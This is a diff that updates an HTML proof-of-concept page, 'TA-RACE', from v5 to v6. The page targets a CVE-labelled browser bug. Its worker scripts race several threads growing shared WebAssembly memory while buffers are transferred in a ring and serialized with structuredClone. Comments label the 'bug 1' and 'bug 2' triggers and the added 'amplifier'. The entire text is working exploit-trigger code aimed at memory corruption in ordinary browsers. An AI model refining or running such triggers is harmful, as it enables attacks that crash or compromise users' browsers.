@@ -1,13 +1,13 @@
 <!doctype html>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>TA-RACE v5</title>
+<title>TA-RACE v6</title>
 <body style="background:#000;color:#0f0;font:13px monospace;white-space:pre-wrap;margin:8px">
-<div id=o>[TA-RACE v5] CVE-2026-112659 + WASM grow</div>
+<div id=o>[TA-RACE v6] transferAnchors + WASM grow, serializer-in-loop</div>
 <script>
 const o=document.getElementById('o');
 const log=m=>{o.textContent+="\n"+m;};
 const tick=()=>new Promise(r=>setTimeout(r,0));
-window.addEventListener('error',e=>log("[ERROR] "+e.message+" @ "+(e.lineno||"?")));
+window.addEventListener('error',e=>log("[ERROR] "+e.message));
 log("[*] UA: "+navigator.userAgent);
 
 const WK=`let u8=null, mem=null, who="";
@@ -27,13 +27,15 @@ onmessage=async e=>{
   if(e.data.mem){
     who=e.data.who; mem=e.data.mem;
     lg("on WASM shared mem");
-    let stale=new Uint8Array(mem.buffer), i=0;
+    let i=0;
     while(true){
-      try{stale[0]=stale[1];}catch(_){}                    // STALE VIEW access (bug 2)
-      try{stale=new Uint8Array(mem.buffer);}catch(_){}      // re-capture after grow
-      try{structuredClone(stale.subarray(0,128));}catch(_){}
-      try{mem.grow(1);}catch(_){}                            // two threads growing = race
-      if((++i&0x1FFF)===0) await new Promise(r=>setTimeout(r,0));
+      // bug 2 trigger: concurrent grow on shared memory
+      try{mem.grow(1);}catch(_){}
+      // amplifier: serialize a view over the growing memory (Oct-27 signature)
+      try{structuredClone(new Uint8Array(mem.buffer));}catch(_){}
+      try{structuredClone(new Float64Array(mem.buffer));}catch(_){}
+      try{const dv=new DataView(mem.buffer); structuredClone(dv);}catch(_){}
+      if((++i&0xFFF)===0) await new Promise(r=>setTimeout(r,0));
     }
   }
 };`;
@@ -45,11 +47,10 @@ wA.onmessage=e=>{if(e.data.log)log(e.data.log);};
 wB.onmessage=e=>{if(e.data.log)log(e.data.log);};
 wC.onmessage=e=>{if(e.data.log)log(e.data.log);};
 
-// ring worker: every hop = one transfer() adoption through transferAnchors (bug 1)
 const wR=new Worker(URL.createObjectURL(new Blob([`
 onmessage=e=>{ for(const ab of e.data.abs){
   let out=ab;
-  try{ out = (Math.random()<0.5) ? ab.transfer() : ab.transferToFixedLength(4096); }catch(_){}
+  try{ out=(Math.random()<0.5)?ab.transfer():ab.transferToFixedLength(4096); }catch(_){}
   try{ postMessage({abs:[out]},[out]); }catch(_){}
 } };
 `])));
@@ -71,7 +72,7 @@ try{
   wA.postMessage({mem:gmem,who:'A'});
   wB.postMessage({mem:gmem,who:'B'});
   wC.postMessage({mem:gmem,who:'C'});
-  log("[3] shared WASM mem -> 3 workers (main also grows)");
+  log("[3] shared WASM mem -> 3 workers (serializer in loop)");
 }catch(e){log("[-] WASM share blocked: "+e.name);}
 
 let inFlight=0;
@@ -92,7 +93,10 @@ wR.onmessage=e=>{
       try{wR.postMessage({abs:[ab]},[ab]);inFlight++;}catch(_){}
     }
     if(mu8){try{structuredClone(mu8.subarray(0,256));}catch(_){}}
-    if(gmem&&((it&0xF)===0)){try{gmem.grow(1);}catch(_){}}  // main = 4th grower thread
+    if(gmem&&((it&0x7)===0)){
+      try{gmem.grow(1);}catch(_){}
+      try{structuredClone(new Uint8Array(gmem.buffer));}catch(_){}
+    }
     it++;
     if((it&0x3FF)===0){log("[*] it="+it+" inflight="+inFlight);await tick();}
   }
